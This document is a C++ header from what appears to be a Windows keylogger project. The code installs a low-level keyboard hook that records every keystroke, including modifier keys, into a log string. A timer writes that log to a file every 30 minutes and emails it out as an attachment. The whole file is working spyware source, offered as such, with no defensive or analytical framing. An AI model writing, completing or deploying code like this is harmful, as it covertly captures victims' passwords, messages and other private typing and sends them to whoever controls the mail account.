#ifndef MAIN_H
#define MAIN_H

#include<iostream>
#include<string>
#include<fstream>
#include<windows.h>
#include"kc.h"
#include"in_out.h"
#include"send_mail.h"

std::string keylog="";

void TimerSendMail()
{
    if(keylog.empty())
        return;

    std::string last_file = inout::log_writer(keylog);

    if(last_file.compare("try error")==0||last_file.compare("catch error")==0)
    {
        HELPER::p_log_file("File creation unsuccessful. keylog '" + last_file + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]","File Attached\n\n" + keylog,inout::path(true)+last_file);
    if(x==7 || x==256)
        keylog="";
    else
        HELPER::p_log_file("Mail not sent ECODE : " + HELPER::tostring(x));
}

Timer MailTimer(TimerSendMail,500 * 60,Timer::Infinite);

HHOOK ehook = NULL;

LRESULT OurKeyboardProc(int nCode,WPARAM wparam,LPARAM lparam)
{
    if(nCode<0)
        CallNextHookEx(ehook,nCode,wparam,lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam==WM_KEYDOWN||wparam==WM_SYSKEYDOWN)
    {
        keylog+=keys::K[kbs->vkCode].Name;
        if(kbs->vkCode==VK_RETURN)
            keylog+='\n';
    }
    else if(wparam==WM_KEYUP||wparam==WM_SYSKEYUP)
    {
        DWORD key=kbs->vkCode;
        if(key==VK_CONTROL||
                key==VK_LCONTROL||key==VK_RCONTROL||
                key==VK_SHIFT||
                key==VK_LSHIFT||key==VK_RSHIFT||
                key==VK_MENU||
                key==VK_LMENU||key==VK_RMENU||
                key==VK_CAPITAL||
                key==VK_NUMLOCK||
                key==VK_LWIN||key==VK_RWIN
           )
        {
            std::string KeyName = keys::K[kbs->vkCode].Name;
            KeyName.insert(1,"/");
            keylog += KeyName;
        }
    }

    return CallNextHookEx(ehook,nCode,wparam,lparam);
}

bool installHook()
{
    HELPER::p_log_file("HOOK and TIMER STARTED");
    MailTimer.start(true);

    ehook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)OurKeyboardProc,GetModuleHandle(NULL),0);

    return ehook==NULL;
}

bool uninstallHook()
{
    BOOL b = UnhookWindowsHookEx(ehook);
    ehook = NULL;
    return (bool)b;
}

bool isHooked()
{
    return (bool)(ehook==NULL);
}

#endif // MAIN_H
